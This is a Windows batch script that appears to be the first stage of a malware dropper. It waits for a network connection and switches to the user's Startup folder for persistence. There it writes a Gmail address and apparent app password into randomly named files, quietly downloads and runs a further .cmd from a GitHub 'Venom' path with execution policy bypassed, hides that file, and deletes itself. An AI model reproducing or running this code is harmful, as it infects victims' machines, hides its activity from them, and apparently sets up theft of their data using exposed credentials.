@echo off

set "initial_dir=%cd%"
set "STARTUP=C:/Users/%USERNAME%/AppData/Roaming/Microsoft/Windows/Start Menu/Programs/Startup"

:check_internet
ping -n 1 8.8.8.8 >nul 2>&1
if errorlevel 1 (
    timeout /t 100 >nul
    goto check_internet
)

cd %STARTUP%

echo goat3dmofo@gmail.com >> PkUbTvqXFIdB.txt
echo qcihadixhgspywjw >> NzKnmxLrbsBw.txt

powershell powershell.exe -windowstyle hidden "Invoke-WebRequest -Uri https://raw.githubusercontent.com/P0k3m0n-unleashed/ProjSucc/refs/heads/master/Venom/files/wget.cmd -OutFile IVbaANzwiphH.cmd"

attrib +h "%STARTUP%\IVbaANzwiphH.cmd"

powershell -windowstyle hidden -ExecutionPolicy Bypass ./IVbaANzwiphH.cmd

cd "%initial_dir%"

del initial.cmd
